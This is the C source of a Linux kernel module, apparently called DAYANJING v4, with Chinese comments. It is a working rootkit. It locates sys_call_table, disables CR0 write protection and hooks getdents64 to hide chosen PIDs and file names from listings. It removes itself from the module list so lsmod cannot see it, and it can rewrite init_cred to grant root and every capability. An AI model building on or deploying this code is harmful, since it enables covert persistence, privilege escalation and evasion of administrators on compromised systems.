// SPDX-License-Identifier: GPL-2.0
/*
 * DAYANJING v4 — 23_lkm 内核侧绑定（LKM 本体）
 *
 * 编译要求：目标机的内核头文件 + kbuild 树
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *
 * 本文件刻意不实现任何"策略逻辑"：隐藏哪些条目、写哪些 cred 字段、
 * 怎么摘链表，全部由 src/lkm.c 承担，并经 lkm_mem 回调注入到这里。
 * 这样同一份核心在 LKM 内 / 用户态测试 / kcore 上跑的是同一段代码，
 * 策略的每一次写入都能在用户态被逐字节断言。
 *
 * 本文件只做四件内核特有的事：
 *   1. 解析 sys_call_table 与内核符号地址
 *   2. 开关 CR0.WP（sys_call_table 所在页是只读的）
 *   3. 在内核虚拟地址上实现 lkm_mem 的读写回调
 *   4. 与用户态缓冲区之间搬运数据（copy_from_user / copy_to_user）
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/version.h>
#include <linux/preempt.h>
#include <linux/compiler.h>
#include <asm/processor.h>
#include <asm/unistd.h>

#include "lkm.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dayanjing");
MODULE_DESCRIPTION("version-adaptive kernel-side binding");

/* ----------------------------- 模块参数 ----------------------------- */

static int  hide_pid   = 0;
static char hide_name[64] = "";
static int  hide_self  = 1;
static int  do_root    = 0;

module_param(hide_pid, int, 0644);
module_param_string(hide_name, hide_name, sizeof(hide_name), 0644);
module_param(hide_self, int, 0644);
module_param(do_root, int, 0644);

MODULE_PARM_DESC(hide_pid,  "隐藏 /proc/<pid> 与 ps 中的该 pid");
MODULE_PARM_DESC(hide_name, "隐藏目录项中名为该值的条目");
MODULE_PARM_DESC(hide_self, "从模块链表摘除自身（lsmod 不可见）");
MODULE_PARM_DESC(do_root,   "加载即把 init_cred 改写为 root 全集");

/* ------------------------- 内核虚拟地址读写 ------------------------- */

/* LKM 内没有"越界"概念：地址非法时 memcpy 会 oops。
 * 因此这一层只做一件事——不引入额外检查，免得掩盖真正的错误。
 * 合法性由调用方（符号解析结果）保证。 */
static int kern_rd(void *ud, uint64_t va, void *buf, size_t n)
{
    (void)ud;
    memcpy(buf, (const void *)(uintptr_t)va, n);
    return LKM_OK;
}

static int kern_wr(void *ud, uint64_t va, const void *buf, size_t n)
{
    (void)ud;
    memcpy((void *)(uintptr_t)va, buf, n);
    return LKM_OK;
}

static lkm_mem g_kmem = { kern_rd, kern_wr, NULL };

/* --------------------------- CR0.WP 开关 --------------------------- */

static unsigned long lkm_cr0_clear_wp(void)
{
    unsigned long cr0 = read_cr0();
    /* 关中断 + 禁止抢占：否则我们在改表项的瞬间可能被调度到另一个 CPU，
     * 而那个 CPU 上的 WP 仍是置位的——表现为概率性 oops。 */
    preempt_disable();
    barrier();
    write_cr0(cr0 & ~X86_CR0_WP);
    barrier();
    return cr0;
}

static void lkm_cr0_restore(unsigned long cr0)
{
    write_cr0(cr0);
    barrier();
    preempt_enable();
}

/* --------------------------- 符号解析 --------------------------- */

static unsigned long (*lkm_kallsyms)(const char *name);

/* 5.7+ 起 kallsyms_lookup_name 不再导出。用 kprobe 先拿到它的地址：
 * 注册一个探测点，kprobe 的 addr 字段会被内核填成已解析地址，
 * 借此反推 kallsyms_lookup_name 本身。 */
static unsigned long lkm_resolve_kallsyms(void)
{
    unsigned long addr = 0;

#ifdef CONFIG_KALLSYMS
    addr = kallsyms_lookup_name("kallsyms_lookup_name");
    if (addr)
        return addr;
#endif

#ifdef CONFIG_KPROBES
    {
        struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
        int rc = register_kprobe(&kp);
        if (rc == 0) {
            addr = (unsigned long)kp.addr;
            unregister_kprobe(&kp);
        }
    }
#endif
    return addr;
}

static unsigned long lkm_lookup(const char *name)
{
    if (!lkm_kallsyms)
        return 0;
    return lkm_kallsyms(name);
}

/* --------------------------- getdents64 hook --------------------------- */

typedef asmlinkage long (*sys_getdents64_t)(const struct pt_regs *);

static sys_getdents64_t orig_getdents64;
static unsigned long   g_sys_call_table;
static uint64_t        g_orig_slot;     /* lkm_hook_restore 的期望值来源 */

#define LKM_GETDENTS64_NR __NR_getdents64
#define LKM_MAX_DIRBUF    (1024 * 1024)

/* 隐藏判定：pid 与名字任一命中即隐藏 */
static int lkm_should_hide(const char *name, uint64_t ino, uint8_t type, void *ud)
{
    (void)ino;
    (void)type;
    (void)ud;

    if (hide_name[0] && strcmp(name, hide_name) == 0)
        return 1;
    if (hide_pid > 0) {
        uint64_t want = (uint64_t)hide_pid;
        if (lkm_dirent_hide_pid(name, 0, 0, &want))
            return 1;
    }
    return 0;
}

static asmlinkage long lkm_getdents64(const struct pt_regs *regs)
{
    long ret;
    void __user *ubuf;
    void *kbuf;
    size_t nlen;
    size_t removed;

    if (!orig_getdents64)
        return -ENOSYS;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;                     /* 出错或已到末尾：原样返回 */

    ubuf = (void __user *)regs->si;
    if (!access_ok(ubuf, ret))
        return ret;

    if ((unsigned long)ret > LKM_MAX_DIRBUF)
        return ret;                     /* 超大结果不处理：不为其分配大块内存 */

    kbuf = kvmalloc((size_t)ret, GFP_KERNEL);
    if (!kbuf)
        return ret;                     /* 分配失败就放行原始列表，绝不改写返回码 */

    if (copy_from_user(kbuf, ubuf, (size_t)ret)) {
        kvfree(kbuf);
        return ret;                     /* 读失败：放行，不隐藏 */
    }

    if (lkm_dirent_filter(kbuf, (size_t)ret, lkm_should_hide, NULL,
                          &nlen, &removed) != LKM_OK || removed == 0) {
        kvfree(kbuf);
        return ret;                     /* 缓冲区畸形或无命中：原样返回 */
    }

    if (copy_to_user(ubuf, kbuf, nlen)) {
        kvfree(kbuf);
        return ret;                     /* 写失败：宁可让他看到原列表，也不写半截 */
    }

    kvfree(kbuf);
    return (long)nlen;
}

/* ------------------------------ init/exit ------------------------------ */

static int __init lkm_init(void)
{
    unsigned long cr0;
    int rc;

    if (lkm_selftest() != 0) {
        pr_err("dayanjing: core selftest failed, refusing to load\n");
        return -EINVAL;
    }

    lkm_kallsyms = (unsigned long (*)(const char *))lkm_resolve_kallsyms();
    if (!lkm_kallsyms) {
        pr_err("dayanjing: cannot resolve kallsyms_lookup_name\n");
        return -ENOTSUPP;
    }

    g_sys_call_table = lkm_lookup("sys_call_table");
    if (!g_sys_call_table) {
        pr_err("dayanjing: sys_call_table not found\n");
        return -ENOENT;
    }

    if (do_root) {
        /* 直接改写 init_cred：所有后续新建进程共享它。
         * 需要一份运行时探测出的布局；LKM 内没有 /proc/kcore 可用，
         * 因此这里用 offsetof 由目标机头文件在编译期得出——
         * 与目标内核头文件严格配套时才可信。 */
        klayout_cred L;
        memset(&L, 0, sizeof(L));
        L.usage           = offsetof(struct cred, usage);
        L.uid             = offsetof(struct cred, uid);
        L.gid             = offsetof(struct cred, gid);
        L.suid            = offsetof(struct cred, suid);
        L.sgid            = offsetof(struct cred, sgid);
        L.euid            = offsetof(struct cred, euid);
        L.egid            = offsetof(struct cred, egid);
        L.fsuid           = offsetof(struct cred, fsuid);
        L.fsgid           = offsetof(struct cred, fsgid);
        L.securebits      = offsetof(struct cred, securebits);
        L.cap_inheritable = offsetof(struct cred, cap_inheritable);
        L.cap_permitted   = offsetof(struct cred, cap_permitted);
        L.cap_effective   = offsetof(struct cred, cap_effective);
        L.cap_bset        = offsetof(struct cred, cap_bset);
        L.cap_ambient     = offsetof(struct cred, cap_ambient);
        /* 不用 CAP_FULL_SET：该宏在部分内核版本已被移除。
         * CAP_LAST_CAP 来自 uapi，跨版本稳定。 */
        L.cap_full_mask   = (CAP_LAST_CAP + 1 >= 64)
                            ? ~0ULL
                            : ((1ULL << (CAP_LAST_CAP + 1)) - 1ULL);
        L.probed          = 1;

        rc = lkm_cred_apply(&g_kmem, (uint64_t)(uintptr_t)&init_cred, &L);
        if (rc != LKM_OK)
            pr_warn("dayanjing: cred apply rc=%d (%s)\n", rc, lkm_strerror(rc));
    }

    cr0 = lkm_cr0_clear_wp();

    rc = lkm_hook_install(&g_kmem, (uint64_t)g_sys_call_table,
                          LKM_GETDENTS64_NR,
                          (uint64_t)(uintptr_t)lkm_getdents64, &g_orig_slot);
    lkm_cr0_restore(cr0);

    if (rc != LKM_OK) {
        pr_err("dayanjing: hook install rc=%d (%s)\n", rc, lkm_strerror(rc));
        return -EBUSY;
    }
    orig_getdents64 = (sys_getdents64_t)(uintptr_t)g_orig_slot;

    if (hide_self) {
        /* 从模块链表摘除：lsmod / /proc/modules 都遍历这条链表。
         * 互指校验失败时 lkm_unlink_node 会返回 CORRUPT 且一个字节都不写。 */
        rc = lkm_unlink_node(&g_kmem, (uint64_t)(uintptr_t)THIS_MODULE,
                             offsetof(struct module, list),
                             offsetof(struct module, list) + sizeof(void *),
                             0);
        if (rc != LKM_OK && rc != LKM_ERR_NOTFOUND)
            pr_warn("dayanjing: self-hide rc=%d (%s)\n", rc, lkm_strerror(rc));
    }

    pr_info("dayanjing: loaded (hide_pid=%d hide_name='%s')\n", hide_pid, hide_name);
    return 0;
}

static void __exit lkm_exit(void)
{
    unsigned long cr0;
    int rc;

    if (orig_getdents64 && g_sys_call_table) {
        cr0 = lkm_cr0_clear_wp();
        rc = lkm_hook_restore(&g_kmem, (uint64_t)g_sys_call_table,
                              LKM_GETDENTS64_NR,
                              (uint64_t)(uintptr_t)lkm_getdents64, g_orig_slot);
        lkm_cr0_restore(cr0);
        if (rc != LKM_OK && rc != LKM_ERR_ALREADY)
            pr_warn("dayanjing: hook restore rc=%d (%s)\n", rc, lkm_strerror(rc));
    }
    pr_info("dayanjing: unloaded\n");
}

module_init(lkm_init);
module_exit(lkm_exit);
